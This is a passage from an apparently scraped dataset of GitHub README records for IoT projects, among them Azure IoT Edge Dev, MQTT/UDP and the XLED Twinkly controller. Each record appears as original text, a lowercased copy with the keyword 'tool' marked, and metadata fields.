container.\nInstall Docker CE\nFor Windows, please follow the document to open Docker Settings and setup a Shared Drive.\nFor macOS, please follow the document to choose local directories to share with your containers.\nNote: If the device is behind the proxy server, you can set the proxy manually\nRun the IoT Edge Dev Container\nBefore you run the container, you will need to create a local folder to store your IoT Edge solution files.\nWindows\nmkdir c:\\temp\\iotedge\ndocker run -ti -v /var/run/docker.sock:/var/run/docker.sock -v c:/temp/iotedge:/home/iotedge mcr.microsoft.com/iotedge/iotedgedev\nLinux\nsudo mkdir /home/iotedge\nsudo docker run -ti -v /var/run/docker.sock:/var/run/docker.sock -v ~/iotedge:/home/iotedge mcr.microsoft.com/iotedge/iotedgedev\nmacOS\nmkdir ~/iotedge\ndocker run -ti -v /var/run/docker.sock:/var/run/docker.sock -v ~/iotedge:/home/iotedge mcr.microsoft.com/iotedge/iotedgedev\nInitialize IoT Edge solution and setup Azure resources\niotedgedev init\niotedgedev init will create a solution and setup your Azure IoT Hub in a single command. The solution comes with a default C# module named filtermodule.\nMore information\nBuild IoT Edge module images\nsudo iotedgedev build\nThis step will build user modules in deployment.template.json targeting amd64 platform.\nMore information\nSetup and start the IoT Edge Simulator to run the solution\nsudo iotedgedev start --setup --file config/deployment.amd64.json\nMore information\nMonitor messages sent from IoT Edge Simulator to IoT Hub\niotedgedev monitor\nMore information\nDocker containers/images management\nThe containers used by the simulator will be cleaned up when the simulator stops running iotedgedev stop\nAll remaining containers can be cleaned up using iotedgedev docker clean -c\nAll remaining images can be cleaned up using iotedgedev docker clean -i\nResources\nPlease refer to the Wiki for details on setup, usage, and troubleshooting.\nData/Telemetry\nThis project collects usage data and sends it to Microsoft to help improve our products and services. Read our privacy statement to learn more. If you don\u2019t wish to send usage data to Microsoft, you can change your telemetry settings by updating collect_telemetry to no in ~/.iotedgedev/settings.ini.\nContributing\nThis project welcomes contributions and suggestions. Please refer to the Contributing file for details on contributing changes.\nMost contributions require you to agree to a Contributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us the rights to use your contribution. For details, visit https://cla.microsoft.com.\nWhen you submit a pull request, a CLA-bot will automatically determine whether you need to provide a CLA and decorate the PR appropriately (e.g., label, comment). Simply follow the instructions provided by the bot. You will only need to do this once across all repositories using our CLA.\nThis project has adopted the Microsoft Open Source Code of Conduct. For more information see the Code of Conduct FAQ or contact opencode@microsoft.com with any additional questions or comments.\nSupport\nThe team monitors the issue section on regular basis and will try to assist with troubleshooting or questions related IoT Edge tools on a best effort basis.\nA few tips before opening an issue. Try to generalize the problem as much as possible. Examples include\nRemoving 3rd party components\nReproduce the issue with provided deployment manifest used\nSpecify whether issue is reproducible on physical device or simulated device or both Also, Consider consulting on the docker docs channel for general docker questions.", "link": "https://github.com/Azure/iotedgedev", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "azure iot edge dev -----> tool !!! \nthe iot edge dev -----> tool !!!  greatly simplifies azure iot edge development down to simple commands driven by environment variables.\nit gets you started with iot edge development with the iot edge dev container and iot edge solution scaffolding that contains a default module and all the required configuration files.\nit speeds up your inner-loop dev (dev, debug, test) by reducing multi-step build & deploy processes into one-line cli commands as well as drives your outer-loop ci/cd pipeline. you can use all the same commands in both stages of your development life-cycle.\noverview\nfor the absolute fastest way to get started with iot edge dev, please see the quickstart section below.\nfor a more detailed overview of iot edge dev tool including setup and commands, please see the wiki.\nquickstart\nto set up development machines manually instead of using the iot edge dev container, please see the manual development machine setup wiki.\nthis quickstart will run a container, create a solution, setup azure resources, build and deploy modules to your device, setup and start the iot edge simulator, monitor messages flowing into iot hub, and finally deploy to the iot edge runtime.\nthe only thing you need to install is docker. all of the other dev dependencies are included in the container.\ninstall docker ce\nfor windows, please follow the document to open docker settings and setup a shared drive.\nfor macos, please follow the document to choose local directories to share with your containers.\nnote: if the device is behind the proxy server, you can set the proxy manually\nrun the iot edge dev container\nbefore you run the container, you will need to create a local folder to store your iot edge solution files.\nwindows\nmkdir c:\\temp\\iotedge\ndocker run -ti -v /var/run/docker.sock:/var/run/docker.sock -v c:/temp/iotedge:/home/iotedge mcr.microsoft.com/iotedge/iotedgedev\nlinux\nsudo mkdir /home/iotedge\nsudo docker run -ti -v /var/run/docker.sock:/var/run/docker.sock -v ~/iotedge:/home/iotedge mcr.microsoft.com/iotedge/iotedgedev\nmacos\nmkdir ~/iotedge\ndocker run -ti -v /var/run/docker.sock:/var/run/docker.sock -v ~/iotedge:/home/iotedge mcr.microsoft.com/iotedge/iotedgedev\ninitialize iot edge solution and setup azure resources\niotedgedev init\niotedgedev init will create a solution and setup your azure iot hub in a single command. the solution comes with a default c# module named filtermodule.\nmore information\nbuild iot edge module images\nsudo iotedgedev build\nthis step will build user modules in deployment.template.json targeting amd64 platform.\nmore information\nsetup and start the iot edge simulator to run the solution\nsudo iotedgedev start --setup --file config/deployment.amd64.json\nmore information\nmonitor messages sent from iot edge simulator to iot hub\niotedgedev monitor\nmore information\ndocker containers/images management\nthe containers used by the simulator will be cleaned up when the simulator stops running iotedgedev stop\nall remaining containers can be cleaned up using iotedgedev docker clean -c\nall remaining images can be cleaned up using iotedgedev docker clean -i\nresources\nplease refer to the wiki for details on setup, usage, and troubleshooting.\ndata/telemetry\nthis project collects usage data and sends it to microsoft to help improve our products and services. read our privacy statement to learn more. if you don\u2019t wish to send usage data to microsoft, you can change your telemetry settings by updating collect_telemetry to no in ~/.iotedgedev/settings.ini.\ncontributing\nthis project welcomes contributions and suggestions. please refer to the contributing file for details on contributing changes.\nmost contributions require you to agree to a contributor license agreement (cla) declaring that you have the right to, and actually do, grant us the rights to use your contribution. for details, visit https://cla.microsoft.com.\nwhen you submit a pull request, a cla-bot will automatically determine whether you need to provide a cla and decorate the pr appropriately (e.g., label, comment). simply follow the instructions provided by the bot. you will only need to do this once across all repositories using our cla.\nthis project has adopted the microsoft open source code of conduct. for more information see the code of conduct faq or contact opencode@microsoft.com with any additional questions or comments.\nsupport\nthe team monitors the issue section on regular basis and will try to assist with troubleshooting or questions related iot edge tools on a best effort basis.\na few tips before opening an issue. try to generalize the problem as much as possible. examples include\nremoving 3rd party components\nreproduce the issue with provided deployment manifest used\nspecify whether issue is reproducible on physical device or simulated device or both also, consider consulting on the docker docs channel for general docker questions.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000488, "year": null}, {"Unnamed: 0": 489, "autor": 489, "date": null, "content": "ESP8266 NodeMCU Workshop\nCheck the wiki for the full workshop documentation :)\nExamples\nled\nbutton\nneopixels\ndht11\nsdd1306\nsdcard\nota\nap\nrgb-lamp\nsg90\nNodeMCU\nPlatformIO IDE for Atom\nPlatformIO IDE is the next-generation integrated development environment for IoT.\nhttp://platformio.org\nInstallation\nGetting started with PlatformIO and NodeMCU\nPhant IoT Server\nPhant is a modular logging tool developed by SparkFun Electronics for collecting data from the Internet of Things. phant is the open source software that powers data.sparkfun.com.\nhttp://phant.io/\nhttps://github.com/sparkfun/phant\nLibraries\nArduino core for ESP8266 WiFi chip\nWifiManager\nPhant Arduino\nPhant Python", "link": "https://github.com/lvidarte/esp8266", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "esp8266 nodemcu workshop\ncheck the wiki for the full workshop documentation :)\nexamples\nled\nbutton\nneopixels\ndht11\nsdd1306\nsdcard\nota\nap\nrgb-lamp\nsg90\nnodemcu\nplatformio ide for atom\nplatformio ide is the next-generation integrated development environment for iot.\nhttp://platformio.org\ninstallation\ngetting started with platformio and nodemcu\nphant iot server\nphant is a modular logging -----> tool !!!  developed by sparkfun electronics for collecting data from the internet of things. phant is the open source software that powers data.sparkfun.com.\nhttp://phant.io/\nhttps://github.com/sparkfun/phant\nlibraries\narduino core for esp8266 wifi chip\nwifimanager\nphant arduino\nphant python", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000489, "year": null}, {"Unnamed: 0": 503, "autor": 503, "date": null, "content": "Awesome Azure IoT\nA curated list of awesome Azure Internet of Things projects and resources. Please visit https://github.com/Azure/iot for the official list.\nHardware\nOperating System\nIoT Clouds\nGet started with IoT Hub\nFramework\nSDK\nLibraries and Tools\nResources\nHardware\nAzure IoT Developer Kit - The Microsoft Azure MXChip IoT Developer Kit (a.k.a DevKit) can be used to develop and prototype IoT solutions leveraging Microsoft Azure services. It includes an Arduino compatible board with rich peripherals and sensors, an open-source board package and a growing projects catalog.\nAzure Certified for IoT device catalog - Certified for IoT devices tailored to your needs.\nMicrosoft Azure IoT Starter Kits - Start innovating today with kits that include development boards that are 'Azure Certified for IoT', sensors and actuators. Simple user-friendly tutorials help you seamlessly connect your devices to the cloud with Microsoft Azure IoT.\nOperating System\nWindows 10 IoT Core - Windows 10 IoT is a family of Windows 10 editions targeted towards a wide range of intelligent devices, from small industrial gateways to larger more complex devices like point of sales terminals and ATMs..\nIoT Clouds\nAzure IoT Hub - Connect, monitor, and manage billions of IoT assets. Azure IoT Hub is a fully managed service that enables reliable and secure bidirectional communications between millions of IoT devices and a solution back end.\nAzure IoT Edge - Azure IoT Edge moves cloud analytics and custom business logic to devices so that your organization can focus on business insights instead of data management.\nAzure Event Hubs - Cloud-scale telemetry ingestion from websites, apps, and any streams of data.\nAzure Stream Analytics - Real-time data stream processing from millions of IoT devices.\nMicrosoft IoT Central - A fully managed SaaS offering for customers and partners that enables powerful IoT scenarios without requiring cloud solution expertise.\nAzure Time Series Insights - A fully managed analytics, storage, and visualization service that makes it simple to explore and analyze billions of IoT events simultaneously.\nGet started with IoT Hub\nSimulated device - Connect your simulated device to your IoT hub using Node.js.\nRaspberry Pi 3 - Connect your Raspberry Pi 3 device to your IoT hub using Node.js.\nAdafruit Feather M0 WiFi - Get started with your Arduino board: Adafruit Feather M0 WiFi.\nAdafruit Feather HUZZAH ESP8266 - Get started with your Arduino board: Adafruit Feather HUZZAH ESP8266.\nSparkfun ESP8266 Thing Dev - Get started with your Arduino board: Sparkfun ESP8266 Thing Dev.\nIntel Edison - Connect your Intel Edison device to your IoT hub using C.\nMXChip IoT Developer Kit - Get started with your MXChip IoT Developer Kit.\nFramework\nAzure IoT Protocol Gateway - Azure IoT protocol gateway is a framework for protocol adaptation that enables bi-directional communication with Azure IoT Hub. It is a pass-through component that bridges traffic between connected IoT devices and IoT Hub.\nSDK\nAzure IoT device SDK - The Microsoft Azure IoT device SDKs contain code that facilitates building devices and applications that connect to and are managed by Azure IoT Hub services.\nAzure IoT service SDK - The Azure IoT service SDKs contain code to facilitate building applications that interact directly with IoT Hub to manage devices and security.\nAzure IoT Edge SDK - Azure IoT Edge moves cloud analytics and custom business logic to devices so that your organization can focus on business insights instead of data management.\nLibraries and Tools\nAzure IoT Edge - Develop, deploy, debug, and manage your IoT Edge solution.\nAzure IoT Toolkit - Interact with Azure IoT Hub, IoT Device Management, IoT Hub Code Snippets.\nPlatformIO for Visual Studio Code - PlatformIO is an open source ecosystem for IoT development. It supports 350+ embedded boards, 20+ development platforms and 10+ frameworks.\nAzure IoT Web Client - A web-based client tool for Azure IoT Hub to send and monitor device-to-cloud messages.\nAzure CLI - Commands to connect, monitor, and control millions of IoT assets.\nIoT Hub REST API - The REST APIs for IoT Hub offer programmatic access to the device and messaging services, as well as the resource provder, in IoT Hub.\nIoT Hub Explorer - A CLI tool to manage device identities in your IoT hub registry, send and receive messages and files from your devices, and monitor your IoT hub operations.\nDevice Explorer - This tool enables you to perform operations such as manage the devices registered to an IoT hub, view device-to-cloud messages sent to an IoT hub, and send cloud-to-device messages from an IoT hub. Note this tool only runs on Windows.\nIoT Hub Diagnostics Tool - This tool is provided to help diagnose issues with a device connecting to Azure IoT Hubs.\nResources\nAzure IoT Developer Center - Get started with Azure IoT Suite and IoT Hub and learn how easy it is to connect your IoT devices to Microsoft Azure.\nAzure IoT Hub Code Samples - Learn to interact with Azure IoT Hub through code.\nAzure IoT Hub updates - Service Updates for Azure IoT Hub.\nAzure IoT Hub limits - List the limits associated with the different service tiers (S1, S2, S3, F1).\nAzure IoT Suite - Get started quickly with Microsoft Azure IoT Suite. Use preconfigured solutions, and accelerate the development of your Internet of Things (IoT) solution.\nInternet of Things partners - Connect with a partner to unleash the powerful potential and business value of the Internet of Things (IoT). Whether you\u2019re looking for a complete IoT solution, or building your own using certified devices, engage with an Azure IoT partner to tailor a solution for the needs of your business.\nAzure Blog for Internet of Things - The official Microsoft Azure Blog for topics about Internet of Things.\nIoT Developer Blog - MSDN Blog about Tooling and Experience for IoT Developer.", "link": "https://github.com/formulahendry/awesome-azure-iot", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "awesome azure iot\na curated list of awesome azure internet of things projects and resources. please visit https://github.com/azure/iot for the official list.\nhardware\noperating system\niot clouds\nget started with iot hub\nframework\nsdk\nlibraries and tools\nresources\nhardware\nazure iot developer kit - the microsoft azure mxchip iot developer kit (a.k.a devkit) can be used to develop and prototype iot solutions leveraging microsoft azure services. it includes an arduino compatible board with rich peripherals and sensors, an open-source board package and a growing projects catalog.\nazure certified for iot device catalog - certified for iot devices tailored to your needs.\nmicrosoft azure iot starter kits - start innovating today with kits that include development boards that are 'azure certified for iot', sensors and actuators. simple user-friendly tutorials help you seamlessly connect your devices to the cloud with microsoft azure iot.\noperating system\nwindows 10 iot core - windows 10 iot is a family of windows 10 editions targeted towards a wide range of intelligent devices, from small industrial gateways to larger more complex devices like point of sales terminals and atms..\niot clouds\nazure iot hub - connect, monitor, and manage billions of iot assets. azure iot hub is a fully managed service that enables reliable and secure bidirectional communications between millions of iot devices and a solution back end.\nazure iot edge - azure iot edge moves cloud analytics and custom business logic to devices so that your organization can focus on business insights instead of data management.\nazure event hubs - cloud-scale telemetry ingestion from websites, apps, and any streams of data.\nazure stream analytics - real-time data stream processing from millions of iot devices.\nmicrosoft iot central - a fully managed saas offering for customers and partners that enables powerful iot scenarios without requiring cloud solution expertise.\nazure time series insights - a fully managed analytics, storage, and visualization service that makes it simple to explore and analyze billions of iot events simultaneously.\nget started with iot hub\nsimulated device - connect your simulated device to your iot hub using node.js.\nraspberry pi 3 - connect your raspberry pi 3 device to your iot hub using node.js.\nadafruit feather m0 wifi - get started with your arduino board: adafruit feather m0 wifi.\nadafruit feather huzzah esp8266 - get started with your arduino board: adafruit feather huzzah esp8266.\nsparkfun esp8266 thing dev - get started with your arduino board: sparkfun esp8266 thing dev.\nintel edison - connect your intel edison device to your iot hub using c.\nmxchip iot developer kit - get started with your mxchip iot developer kit.\nframework\nazure iot protocol gateway - azure iot protocol gateway is a framework for protocol adaptation that enables bi-directional communication with azure iot hub. it is a pass-through component that bridges traffic between connected iot devices and iot hub.\nsdk\nazure iot device sdk - the microsoft azure iot device sdks contain code that facilitates building devices and applications that connect to and are managed by azure iot hub services.\nazure iot service sdk - the azure iot service sdks contain code to facilitate building applications that interact directly with iot hub to manage devices and security.\nazure iot edge sdk - azure iot edge moves cloud analytics and custom business logic to devices so that your organization can focus on business insights instead of data management.\nlibraries and tools\nazure iot edge - develop, deploy, debug, and manage your iot edge solution.\nazure iot toolkit - interact with azure iot hub, iot device management, iot hub code snippets.\nplatformio for visual studio code - platformio is an open source ecosystem for iot development. it supports 350+ embedded boards, 20+ development platforms and 10+ frameworks.\nazure iot web client - a web-based client -----> tool !!!  for azure iot hub to send and monitor device-to-cloud messages.\nazure cli - commands to connect, monitor, and control millions of iot assets.\niot hub rest api - the rest apis for iot hub offer programmatic access to the device and messaging services, as well as the resource provder, in iot hub.\niot hub explorer - a cli tool to manage device identities in your iot hub registry, send and receive messages and files from your devices, and monitor your iot hub operations.\ndevice explorer - this tool enables you to perform operations such as manage the devices registered to an iot hub, view device-to-cloud messages sent to an iot hub, and send cloud-to-device messages from an iot hub. note this tool only runs on windows.\niot hub diagnostics tool - this tool is provided to help diagnose issues with a device connecting to azure iot hubs.\nresources\nazure iot developer center - get started with azure iot suite and iot hub and learn how easy it is to connect your iot devices to microsoft azure.\nazure iot hub code samples - learn to interact with azure iot hub through code.\nazure iot hub updates - service updates for azure iot hub.\nazure iot hub limits - list the limits associated with the different service tiers (s1, s2, s3, f1).\nazure iot suite - get started quickly with microsoft azure iot suite. use preconfigured solutions, and accelerate the development of your internet of things (iot) solution.\ninternet of things partners - connect with a partner to unleash the powerful potential and business value of the internet of things (iot). whether you\u2019re looking for a complete iot solution, or building your own using certified devices, engage with an azure iot partner to tailor a solution for the needs of your business.\nazure blog for internet of things - the official microsoft azure blog for topics about internet of things.\niot developer blog - msdn blog about tooling and experience for iot developer.", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000503, "year": null}, {"Unnamed: 0": 508, "autor": 508, "date": null, "content": "MQTT/UDP\nSimpified version of MQTT over UDP: Network is broker!\nSee Russian version / \u0420\u0443\u0441\u0441\u043a\u0430\u044f \u0432\u0435\u0440\u0441\u0438\u044f \u0437\u0434\u0435\u0441\u044c\nMQTT is a cute simple protocol well suited for IoT and similar things.\nBut it can be even simpler and still be very usable: MQTT/UDP is merely an MQTT Publish packets broadcast over an UDP.\nMQTT/UDP is\nExtremely simple\nExtremely fast, minimal possible latency\nExcludes broker (which is single point of failure)\nLowers network traffic (each masurement is sent exactly once to all)\nReasonably reliable (if we use it for sensors, which usually resend data every few seconds or so)\nCan be supported even on a hardware which can not support TCP - in fact, only UDP send is required\nZero configuration - a sensor node needs no setup, it just broadcasts its data. (And, if you still need it, MQTT/UDP supports remote configuration over network.)\nSupports digital signature\nFor further reading\nMQTT/UDP Wiki\nDocumentation\nThis repository contains\nA simple MQTT/UDP implementation in some popular programming languages.\nA simplest MQTT to MQTT/UDP bridge implementation in Pyton.\nA tool to send data from MQTT/UDP to OpenHAB\nA debug application to dump MQTT/UDP traffic (tools/viewer).\nOther tools and utilities\nIf you want to help a project\nFeel free to:\nAdd implementation in your favorite programming language\nWrite a bridge to classic MQTT protocol (we have very simple one here written in Python)\nExtend your favorite MQTT broker or IoT system (OpenHAB?) with MQTT/UDP support\nCheck MQTT/UDP specification/implementation against MQTT spec. We must be compatible where possible.\nIt is really easy.\nReasons to avoid MQTT/UDP\nYou need to transfer long payloads. On some systems size of UDP datagram is limited.\nYou need to know if datagram was delivered for sure. It is impossible with UDP. Though, reliable delivery subsystem is being in development now and will be available soon.\nWays to extend MQTT/UDP\nIt seems to be reasonable to add some kind of signature to packets to prevent data spoofing. Actually, it is already done for Java implementation, C and Pythin will come soon.\nBroadcast is not the best way to transmit data. Multicast is much better. Though multicast is not so well supported in IoT OS's or monitors.\nFast start instructions\nClone repository to local disk\nRead HOWTO file\nSupport tools\nThis repository contains tools to support MQTT/UDP integration and test:\nGUI tool to show current state of data transmitted in tools/viewer directory; see also viewer help page.\nRandom data generator (random_to_udp.py) in python3/examples directory\nSend/check tool for sequentially numbered packets. See seq_storm_send.py and seq_storm_check.py in lang/python3/examples directory\nWireShark dissector to see protocol data on the network in lang/lua/wireshark directory\nCode examples\nPython\nSend data:\nimport mqttudp.engine\nif __name__ == \"__main__\":\nmqttudp.engine.send_publish( \"test_topic\", \"Hello, world!\" )\nListen for data:\nimport mqttudp.engine\ndef recv_packet(ptype,topic,value,pflags,addr):\nif ptype != \"publish\":\nprint( ptype + \", \" + topic + \"\\t\\t\" + str(addr) )\nreturn\nprint( topic+\"=\"+value+ \"\\t\\t\" + str(addr) )\nif __name__ == \"__main__\":\nmqttudp.engine.listen(recv_packet)\nDownload pypi package\nJava\nSend data:\nPublishPacket pkt = new PublishPacket(topic, value);\npkt.send();\nListen for data:\nPacketSourceServer ss = new PacketSourceServer();\nss.setSink( pkt -> { System.out.println(\"Got packet: \"+pkt); });\nDownload JAR\nC\nSend data:\nint rc = mqtt_udp_send_publish( topic, value );\nListen for data:\nint main(int argc, char *argv[])\n{\n...\nint rc = mqtt_udp_recv_loop( mqtt_udp_dump_any_pkt );\n...\n}\nint mqtt_udp_dump_any_pkt( struct mqtt_udp_pkt *o )\n{\nprintf( \"pkt %x flags %x, id %d\",\no->ptype, o->pflags, o->pkt_id\n);\nif( o->topic_len > 0 )\nprintf(\" topic '%s'\", o->topic );\nif( o->value_len > 0 )\nprintf(\" = '%s'\", o->value );\nprintf( \"\\n\");\n}\nLua\nSend data:\nlocal mq = require \"mqtt_udp_lib\"\nmq.publish( topic, val );\nListen for data:\nlocal mq = require \"mqtt_udp_lib\"\nlocal listener = function( ptype, topic, value, ip, port )\nprint(\"'\"..topic..\"' = '\"..val..\"'\"..\"from: \", ip, port)\nend\nmq.listen( listener )\nDownload LuaRock", "link": "https://github.com/dzavalishin/mqtt_udp", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "mqtt/udp\nsimpified version of mqtt over udp: network is broker!\nsee russian version / \u0440\u0443\u0441\u0441\u043a\u0430\u044f \u0432\u0435\u0440\u0441\u0438\u044f \u0437\u0434\u0435\u0441\u044c\nmqtt is a cute simple protocol well suited for iot and similar things.\nbut it can be even simpler and still be very usable: mqtt/udp is merely an mqtt publish packets broadcast over an udp.\nmqtt/udp is\nextremely simple\nextremely fast, minimal possible latency\nexcludes broker (which is single point of failure)\nlowers network traffic (each masurement is sent exactly once to all)\nreasonably reliable (if we use it for sensors, which usually resend data every few seconds or so)\ncan be supported even on a hardware which can not support tcp - in fact, only udp send is required\nzero configuration - a sensor node needs no setup, it just broadcasts its data. (and, if you still need it, mqtt/udp supports remote configuration over network.)\nsupports digital signature\nfor further reading\nmqtt/udp wiki\ndocumentation\nthis repository contains\na simple mqtt/udp implementation in some popular programming languages.\na simplest mqtt to mqtt/udp bridge implementation in pyton.\na -----> tool !!!  to send data from mqtt/udp to openhab\na debug application to dump mqtt/udp traffic (tools/viewer).\nother tools and utilities\nif you want to help a project\nfeel free to:\nadd implementation in your favorite programming language\nwrite a bridge to classic mqtt protocol (we have very simple one here written in python)\nextend your favorite mqtt broker or iot system (openhab?) with mqtt/udp support\ncheck mqtt/udp specification/implementation against mqtt spec. we must be compatible where possible.\nit is really easy.\nreasons to avoid mqtt/udp\nyou need to transfer long payloads. on some systems size of udp datagram is limited.\nyou need to know if datagram was delivered for sure. it is impossible with udp. though, reliable delivery subsystem is being in development now and will be available soon.\nways to extend mqtt/udp\nit seems to be reasonable to add some kind of signature to packets to prevent data spoofing. actually, it is already done for java implementation, c and pythin will come soon.\nbroadcast is not the best way to transmit data. multicast is much better. though multicast is not so well supported in iot os's or monitors.\nfast start instructions\nclone repository to local disk\nread howto file\nsupport tools\nthis repository contains tools to support mqtt/udp integration and test:\ngui tool to show current state of data transmitted in tools/viewer directory; see also viewer help page.\nrandom data generator (random_to_udp.py) in python3/examples directory\nsend/check tool for sequentially numbered packets. see seq_storm_send.py and seq_storm_check.py in lang/python3/examples directory\nwireshark dissector to see protocol data on the network in lang/lua/wireshark directory\ncode examples\npython\nsend data:\nimport mqttudp.engine\nif __name__ == \"__main__\":\nmqttudp.engine.send_publish( \"test_topic\", \"hello, world!\" )\nlisten for data:\nimport mqttudp.engine\ndef recv_packet(ptype,topic,value,pflags,addr):\nif ptype != \"publish\":\nprint( ptype + \", \" + topic + \"\\t\\t\" + str(addr) )\nreturn\nprint( topic+\"=\"+value+ \"\\t\\t\" + str(addr) )\nif __name__ == \"__main__\":\nmqttudp.engine.listen(recv_packet)\ndownload pypi package\njava\nsend data:\npublishpacket pkt = new publishpacket(topic, value);\npkt.send();\nlisten for data:\npacketsourceserver ss = new packetsourceserver();\nss.setsink( pkt -> { system.out.println(\"got packet: \"+pkt); });\ndownload jar\nc\nsend data:\nint rc = mqtt_udp_send_publish( topic, value );\nlisten for data:\nint main(int argc, char *argv[])\n{\n...\nint rc = mqtt_udp_recv_loop( mqtt_udp_dump_any_pkt );\n...\n}\nint mqtt_udp_dump_any_pkt( struct mqtt_udp_pkt *o )\n{\nprintf( \"pkt %x flags %x, id %d\",\no->ptype, o->pflags, o->pkt_id\n);\nif( o->topic_len > 0 )\nprintf(\" topic '%s'\", o->topic );\nif( o->value_len > 0 )\nprintf(\" = '%s'\", o->value );\nprintf( \"\\n\");\n}\nlua\nsend data:\nlocal mq = require \"mqtt_udp_lib\"\nmq.publish( topic, val );\nlisten for data:\nlocal mq = require \"mqtt_udp_lib\"\nlocal listener = function( ptype, topic, value, ip, port )\nprint(\"'\"..topic..\"' = '\"..val..\"'\"..\"from: \", ip, port)\nend\nmq.listen( listener )\ndownload luarock", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000508, "year": null}, {"Unnamed: 0": 519, "autor": 519, "date": null, "content": "XLED - unofficial control of Twinkly - Smart Decoration LED lights\nXLED is a python library and command line interface (CLI) to control Twinkly - Smart Decoration LED lights for Christmas.\nOfficial materials says:\nTwinkly is a LED light device that you can control via smartphone. It allows you to play with colouful and animated effects, or create new ones. Decoration lights, not suitable for household illumination.\nSince its Kickstarter project in 2016 many products were introduced with varying properties and features. Most notably products released since September 2019 are identified as Generation II. Older products are since then referred as Generation I.\nLibrary and CLI are free software available under MIT license.\nInstallation\nBoth library and CLI tool are supported on Linux, primarily Fedora.\nFirst make sure that you have pip installed. E.g. for Fedora:\n$ sudo dnf install python3-pip python3-wheel\nYou might want to create and activate a virtual environment. E.g.:\n$ mkdir -p ~/.virtualenvs\n$ python3 -m venv ~/.virtualenvs/xled\n$ source ~/.virtualenvs/xled/bin/activate\nInstall xled from PyPI:\n$ python3 -m pip install --upgrade xled\nUsage\nIf you have installed the project into virtual environment, activate it first. E.g.\n$ source ~/.virtualenvs/xled/bin/activate\nUse of the library:\n>>> import xled\n>>> discovered_device = xled.discover.discover()\n>>> discovered_device.id\n'Twinkly_33AAFF'\n>>> control = xled.ControlInterface(discovered_device.ip_address, discovered_device.hw_address)\n>>> control.set_mode('movie')\n<ApplicationResponse [1000]>\n>>> control.get_mode()['mode']\n'movie'\n>>> control.get_device_info()['number_of_led']\n210\nDocumentation for the library can be found online.\nUse of the CLI:\n$ xled on\nLooking for any device...\nWorking on device: Twinkly_33AAFF\nTurned on.\nFor more commands and options see xled --help.\nWhy?\nMy first Twinkly was 105 LEDs starter light set. That was the latest available model in 2017: TW105S-EU. As of December 2017 there are only two ways to control lights: mobile app on Android or iOS or hardware button on the cord.\nAndroid application didn't work as advertised on my Xiaomi Redmi 3S phone. On first start it connected and disconnected in very fast pace (like every 1-2 seconds) to the hardware. I wasn't able to control anything at all. Later I wanted to connect it to my local WiFi network. But popup dialog that shouldn't have appear never did so.\nPublic API was promised around Christmas 2016 for next season. Later update from October 2016 it seems API won't be available any time soon:\nAPI for external control are on our dev check list, we definitely need some feedback from the community to understand which could be a proper core set to start with.\nIt turned out that application uses HTTP to control lights. I ended up with capturing network traffic and documented this private API. In the end I'm able to configure the device pretty easilly.\nAs of 2020 Twinkly devices can be controlled by Amazon Alexa and Google Assistant as well. Mobile application now requires an account to operate lights even locally. No sign of public API for local devices though. Therefore with my second device - Twinkly 210 RGB+W Wall I keep improving this library and CLI documentation to be able to operate my devices locally and not rely on availability of manufacturer's servers.\nReferences\nUnofficial documentation of private protocol and API is available online.\nThere are other projects that might be more suitable for your needs:\nTwinkly integration in Home Assistant\nSmartThings:\nTwinkly integration in SmartThings by StevenJonSmith\nTwinkly integration in SmartThings by Dameon87\nTwinklyTree Binding for openHAB\nTwinkly HomeKit Hub for Mongoose OS using Twinkly library for Mongoose OS\nTwinklyWPF - .net 5 GUI and API library\nioBroker.twinkly - twinkly adapter for ioBroker to communicate with the Twinkly lights\nTwinkly.vb for HomeSeer\nthingzi-logic-twinkly - Twinkly lights integration for node red\nPython class to interact with generation I device and IDA Pro loader of firmware binary in Twinkly Twinkly Little Star by F-Secure LABS.\nCredits\nThis package was created with Cookiecutter and the audreyr/cookiecutter-pypackage project template.", "link": "https://github.com/scrool/xled", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "xled - unofficial control of twinkly - smart decoration led lights\nxled is a python library and command line interface (cli) to control twinkly - smart decoration led lights for christmas.\nofficial materials says:\ntwinkly is a led light device that you can control via smartphone. it allows you to play with colouful and animated effects, or create new ones. decoration lights, not suitable for household illumination.\nsince its kickstarter project in 2016 many products were introduced with varying properties and features. most notably products released since september 2019 are identified as generation ii. older products are since then referred as generation i.\nlibrary and cli are free software available under mit license.\ninstallation\nboth library and cli -----> tool !!!  are supported on linux, primarily fedora.\nfirst make sure that you have pip installed. e.g. for fedora:\n$ sudo dnf install python3-pip python3-wheel\nyou might want to create and activate a virtual environment. e.g.:\n$ mkdir -p ~/.virtualenvs\n$ python3 -m venv ~/.virtualenvs/xled\n$ source ~/.virtualenvs/xled/bin/activate\ninstall xled from pypi:\n$ python3 -m pip install --upgrade xled\nusage\nif you have installed the project into virtual environment, activate it first. e.g.\n$ source ~/.virtualenvs/xled/bin/activate\nuse of the library:\n>>> import xled\n>>> discovered_device = xled.discover.discover()\n>>> discovered_device.id\n'twinkly_33aaff'\n>>> control = xled.controlinterface(discovered_device.ip_address, discovered_device.hw_address)\n>>> control.set_mode('movie')\n<applicationresponse [1000]>\n>>> control.get_mode()['mode']\n'movie'\n>>> control.get_device_info()['number_of_led']\n210\ndocumentation for the library can be found online.\nuse of the cli:\n$ xled on\nlooking for any device...\nworking on device: twinkly_33aaff\nturned on.\nfor more commands and options see xled --help.\nwhy?\nmy first twinkly was 105 leds starter light set. that was the latest available model in 2017: tw105s-eu. as of december 2017 there are only two ways to control lights: mobile app on android or ios or hardware button on the cord.\nandroid application didn't work as advertised on my xiaomi redmi 3s phone. on first start it connected and disconnected in very fast pace (like every 1-2 seconds) to the 